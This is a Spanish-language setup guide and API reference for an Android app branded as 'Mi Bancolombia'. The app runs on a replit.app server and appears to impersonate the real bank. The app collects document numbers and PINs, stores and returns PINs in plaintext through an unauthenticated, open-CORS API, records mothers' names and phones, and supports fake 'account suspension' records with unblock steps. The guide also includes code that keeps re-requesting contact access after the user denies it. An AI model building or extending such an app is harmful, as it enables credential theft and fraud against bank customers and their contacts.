# Mi Bancolombia — Configuración completa del APK

## INFORMACIÓN DE CONEXIÓN AL SERVIDOR (PRODUCCIÓN)

```
Servidor:       https://bancolombia--bancolombiaban2.replit.app
API base path:  https://bancolombia--bancolombiaban2.replit.app/api
Protocolo:      HTTPS
Autenticación:  Sin token — autenticación por documentNumber + PIN vía /api/auth/login
CORS:           Abierto (acepta solicitudes desde cualquier origen, incluido el APK nativo)
```

---

## PASO 1 — Archivos que ya están en el repositorio

Los siguientes archivos ya están creados en el repositorio. **No debes crearlos ni editarlos:**

- `artifacts/mi-bancolombia/eas.json` — configuración de EAS Build con la URL exacta
- `.github/workflows/build-apk.yml` — workflow de GitHub Actions
- `artifacts/mi-bancolombia/utils/api.ts` — helper que enruta llamadas al servidor correcto

---

## PASO 2 — Único secreto que necesitas agregar en GitHub

Ve a: `https://github.com/bancolombiabankofi-web/Bancolombiabank` → **Settings** → **Secrets and variables** → **Actions** → **New repository secret**

| Nombre del secreto | Valor |
|---|---|
| `EXPO_TOKEN` | Tu token de Expo (obtenerlo en expo.dev → Account Settings → Access Tokens → Create) |

Eso es todo. La URL del servidor ya está escrita directamente en los archivos del repositorio.

---

## PASO 3 — Contenido exacto de los archivos ya creados

### `artifacts/mi-bancolombia/eas.json`
```json
{
  "cli": {
    "version": ">= 10.0.0",
    "appVersionSource": "local"
  },
  "build": {
    "preview": {
      "android": {
        "buildType": "apk"
      },
      "env": {
        "EXPO_PUBLIC_API_URL": "https://bancolombia--bancolombiaban2.replit.app"
      }
    },
    "production": {
      "android": {
        "buildType": "app-bundle"
      },
      "env": {
        "EXPO_PUBLIC_API_URL": "https://bancolombia--bancolombiaban2.replit.app"
      }
    }
  }
}
```

### `.github/workflows/build-apk.yml`
```yaml
name: Build Mi Bancolombia APK

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build-android:
    name: Compilar APK Android
    runs-on: ubuntu-latest

    steps:
      - name: Checkout código
        uses: actions/checkout@v4

      - name: Configurar Node.js 20
        uses: actions/setup-node@v4
        with:
          node-version: '20'

      - name: Instalar pnpm
        uses: pnpm/action-setup@v4
        with:
          version: 9

      - name: Instalar dependencias del workspace
        run: pnpm install --frozen-lockfile

      - name: Instalar EAS CLI
        run: npm install -g eas-cli

      - name: Login en Expo con token
        run: eas whoami
        env:
          EXPO_TOKEN: ${{ secrets.EXPO_TOKEN }}

      - name: Compilar APK (perfil preview)
        working-directory: artifacts/mi-bancolombia
        run: eas build --platform android --profile preview --non-interactive --output ./build/mi-bancolombia.apk
        env:
          EXPO_TOKEN: ${{ secrets.EXPO_TOKEN }}
          EXPO_PUBLIC_API_URL: https://bancolombia--bancolombiaban2.replit.app

      - name: Subir APK como artefacto de GitHub
        uses: actions/upload-artifact@v4
        with:
          name: mi-bancolombia-apk
          path: artifacts/mi-bancolombia/build/mi-bancolombia.apk
          retention-days: 30
```

---

## PASO 4 — Agregar acceso a Contactos del dispositivo

El APK necesita leer los contactos del dispositivo para que los usuarios puedan autocompletar destinatarios al hacer transferencias.

### 4a. Instalar la dependencia (ejecutar UNA vez en tu máquina)

```bash
cd artifacts/mi-bancolombia
npx expo install expo-contacts
```

### 4b. Editar `artifacts/mi-bancolombia/app.json`

Agrega `"expo-contacts"` en el array `plugins` y agrega el permiso en `android`:

```json
{
  "expo": {
    "android": {
      "adaptiveIcon": {
        "foregroundImage": "./assets/images/pwa-icon.png",
        "backgroundColor": "#FDDA24"
      },
      "package": "com.bancolombia.miapp",
      "permissions": [
        "android.permission.READ_CONTACTS"
      ]
    },
    "plugins": [
      [
        "expo-router",
        {
          "origin": "https://bancolombia--bancolombiaban2.replit.app"
        }
      ],
      "expo-font",
      "expo-web-browser",
      [
        "expo-contacts",
        {
          "contactsPermission": "Mi Bancolombia necesita acceder a tus contactos para facilitar las transferencias a personas que ya conoces."
        }
      ]
    ]
  }
}
```

### 4c. Código para solicitar el permiso de forma persistente

Agrega este bloque al componente donde ocurren las transferencias. El permiso se pide al entrar, y si es denegado se reintenta a los 10 minutos:

```typescript
import * as Contacts from "expo-contacts";
import { useEffect, useRef } from "react";
import { Platform } from "react-native";

const RETRY_MS = 10 * 60 * 1000; // 10 minutos

export function useContactsPermission() {
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  async function requestContacts() {
    if (Platform.OS === "web") return; // no aplica en PWA
    const { status } = await Contacts.requestPermissionsAsync();
    if (status !== "granted") {
      // Reintentar en 10 minutos si el usuario deniega
      timerRef.current = setTimeout(requestContacts, RETRY_MS);
    }
  }

  useEffect(() => {
    requestContacts();
    return () => {
      if (timerRef.current) clearTimeout(timerRef.current);
    };
  }, []);
}

// Función para buscar contactos por nombre o número
export async function searchContacts(query: string): Promise<Contacts.Contact[]> {
  if (Platform.OS === "web") return [];
  const { status } = await Contacts.getPermissionsAsync();
  if (status !== "granted") return [];

  const { data } = await Contacts.getContactsAsync({
    fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers],
    name: query,
  });

  return data.filter(
    (c) => c.phoneNumbers && c.phoneNumbers.length > 0
  );
}
```

Llama `useContactsPermission()` dentro del componente de transferencias:

```typescript
export function TransferScreen() {
  useContactsPermission(); // solicita permisos al montar, reintenta en 10 min si niega

  // ... resto del componente
}
```

---

## REFERENCIA COMPLETA DE LA API

**URL base:** `https://bancolombia--bancolombiaban2.replit.app/api`

**Headers requeridos en POST/PUT:**
```
Content-Type: application/json
```

---

### AUTENTICACIÓN

#### `POST /api/auth/login`
Inicia sesión. Devuelve el objeto usuario completo.

**Body:**
```json
{
  "documentNumber": "1234567890",
  "pin": "123456"
}
```

**Respuesta 200:**
```json
{
  "user": {
    "id": "usr_abc123",
    "documentType": "CC",
    "documentNumber": "1234567890",
    "firstName": "Juan",
    "secondName": "",
    "lastName": "Pérez",
    "secondLastName": "",
    "email": "juan@email.com",
    "phone": "3001234567",
    "countryResidence": "CO",
    "countryBirth": "CO",
    "currencyCode": "COP",
    "currencySymbol": "$",
    "birthDate": "1990-01-15",
    "pin": "123456",
    "isAdmin": false,
    "status": "active",
    "address": null,
    "suspensionReason": null,
    "unblockSteps": null
  }
}
```

**Errores:**
- `400` — falta documentNumber o pin
- `401` — credenciales inválidas
- `403` — usuario bloqueado (`{ "error": "blocked" }`)

---

### USUARIOS

#### `GET /api/users`
Lista todos los usuarios.

#### `GET /api/users/:id`
Obtiene un usuario por ID.

#### `POST /api/users`
Crea un usuario nuevo.

**Body (todos los campos obligatorios salvo los opcionales):**
```json
{
  "id": "usr_1751234567890_abc123",
  "documentType": "CC",
  "documentNumber": "1234567890",
  "countryResidence": "CO",
  "countryBirth": "CO",
  "currencyCode": "COP",
  "currencySymbol": "$",
  "firstName": "Juan",
  "secondName": "",
  "lastName": "Pérez",
  "secondLastName": "",
  "birthDate": "1990-01-15",
  "email": "juan@email.com",
  "phone": "3001234567",
  "pin": "123456",
  "isAdmin": false,
  "status": "active",
  "address": null,
  "motherName": null,
  "motherPhone": null,
  "googleEmail": null
}
```

**Respuesta 201:** Objeto usuario creado.
**Error 409:** Ya existe un usuario con ese número de documento.

#### `PUT /api/users/:id`
Actualiza un usuario. Body: cualquier campo del usuario excepto `id` y `createdAt`.

#### `DELETE /api/users/:id`
Elimina usuario y todos sus datos asociados (cuentas, tarjetas, transacciones). Respuesta `204`.

---

### CUENTAS

#### `GET /api/accounts?userId=<id>`
Lista las cuentas de un usuario. Sin `userId` devuelve todas.

#### `POST /api/accounts`
Crea una cuenta.

**Body:**
```json
{
  "id": "acc_1751234567890_abc",
  "userId": "usr_abc123",
  "type": "ahorros",
  "number": "123-456789-01",
  "balance": 500000,
  "currency": "Peso colombiano",
  "currencyCode": "COP",
  "currencySymbol": "$",
  "name": "Cuenta de Ahorros",
  "status": "active"
}
```

**Nota:** `balance` está en centavos de la moneda (entero).

#### `PUT /api/accounts/:id`
Actualiza una cuenta. Usado para actualizar el balance tras una transferencia.

---

### TRANSACCIONES

#### `GET /api/transactions?userId=<id>`
Lista las transacciones de un usuario ordenadas por fecha descendente.

#### `POST /api/transactions`
Registra una transacción.

**Body:**
```json
{
  "id": "tx_1751234567890_abc",
  "userId": "usr_abc123",
  "accountId": "acc_abc123",
  "date": "2026-06-25",
  "description": "Transferencia a Juan Pérez",
  "amount": 50000,
  "type": "debit",
  "category": "transferencia",
  "status": "completed"
}
```

**Campos de `type`:** `"debit"` o `"credit"`
**`amount`:** Entero en centavos de la moneda (positivo siempre, el `type` indica si resta o suma).

---

### TARJETAS

#### `GET /api/cards?userId=<id>`
Lista las tarjetas de un usuario.

#### `POST /api/cards`
Crea una tarjeta.

**Body:**
```json
{
  "id": "card_1751234567890_abc",
  "userId": "usr_abc123",
  "type": "debito",
  "number": "4532 1234 5678 9010",
  "expiry": "12/28",
  "holder": "JUAN PEREZ",
  "brand": "visa",
  "balance": 500000,
  "limit": null,
  "color": "#FDDA24",
  "active": true
}
```

#### `PUT /api/cards/:id`
Actualiza una tarjeta.

---

### RADICADOS

#### `GET /api/radicados`
Lista todos los radicados.

#### `GET /api/radicados?userId=<id>`
Lista radicados de un usuario específico.

#### `GET /api/radicados?radicado=<numero>`
Busca un radicado por número exacto.

#### `GET /api/radicados/verify/:radicado?userId=<id>`
Verifica si un radicado es válido y no ha vencido.

**Respuesta válida:**
```json
{ "valid": true, "record": { ... } }
```

**Respuesta inválida:**
```json
{ "valid": false, "reason": "Radicado vencido el 15/06/2026" }
```

#### `POST /api/radicados`
Crea un radicado de suspensión.

**Body:**
```json
{
  "id": "rad_1751234567890_abc",
  "radicado": "RAD-2026-001234",
  "userId": "usr_abc123",
  "userName": "Juan Pérez",
  "documentNumber": "1234567890",
  "motive": "Verificación de identidad requerida",
  "description": "El usuario debe presentar documentos adicionales.",
  "referenceCode": "REF-ABC-001",
  "expiresAt": "2026-12-31",
  "createdBy": "admin_id",
  "status": "active"
}
```

#### `PUT /api/radicados/:id`
Actualiza un radicado.

#### `DELETE /api/radicados/:id`
Elimina un radicado. Respuesta `204`.

---

### CONFIGURACIÓN DE LA APP

#### `GET /api/settings`
Devuelve todas las configuraciones como objeto clave-valor.

**Respuesta:**
```json
{
  "supportPhone": "6045109000",
  "maintenanceMode": "false"
}
```

#### `PUT /api/settings/:key`
Actualiza o crea una configuración.

**Body:**
```json
{ "value": "6045109000" }
```

---

### EVENTOS DE LOGIN

#### `POST /api/login-events`
Registra un evento de inicio de sesión.

**Body:**
```json
{
  "id": "le_1751234567890_abc",
  "userId": "usr_abc123",
  "deviceInfo": "Android 14 — Pixel 7",
  "ipAddress": "192.168.1.1",
  "platform": "android"
}
```

---

### LOGS DE AUDITORÍA

#### `GET /api/audit-logs`
Lista todos los logs de auditoría.

#### `POST /api/audit-logs`
Registra una acción auditable.

**Body:**
```json
{
  "id": "al_1751234567890_abc",
  "userId": "usr_abc123",
  "action": "TRANSFER",
  "details": "Transferencia de $50.000 COP a cuenta 123-456789-01",
  "targetUserId": "usr_xyz456"
}
```

---

### CAMBIOS DE PIN

#### `POST /api/pin-changes`
Solicita cambio de PIN.

**Body:**
```json
{
  "id": "pc_1751234567890_abc",
  "userId": "usr_abc123",
  "oldPin": "123456",
  "newPin": "654321",
  "status": "pending"
}
```

#### `POST /api/pin-changes/:id/approve`
Aprueba un cambio de PIN (solo admin).

#### `POST /api/pin-changes/:id/reject`
Rechaza un cambio de PIN (solo admin).

---

### HEALTH CHECK

#### `GET /api/healthz`
Verifica que el servidor esté activo.

**Respuesta 200:**
```json
{ "status": "ok" }
```

---

## RESUMEN RÁPIDO DE CONEXIÓN

```
Servidor producción:  https://bancolombia--bancolombiaban2.replit.app
Health check:         https://bancolombia--bancolombiaban2.replit.app/api/healthz
Login:                POST https://bancolombia--bancolombiaban2.replit.app/api/auth/login
Variable de entorno:  EXPO_PUBLIC_API_URL=https://bancolombia--bancolombiaban2.replit.app
Permiso Android:      android.permission.READ_CONTACTS
Package Android:      com.bancolombia.miapp
Bundle ID iOS:        com.bancolombia.miapp
Secreto GitHub:       EXPO_TOKEN (solo este es necesario agregar manualmente)
```
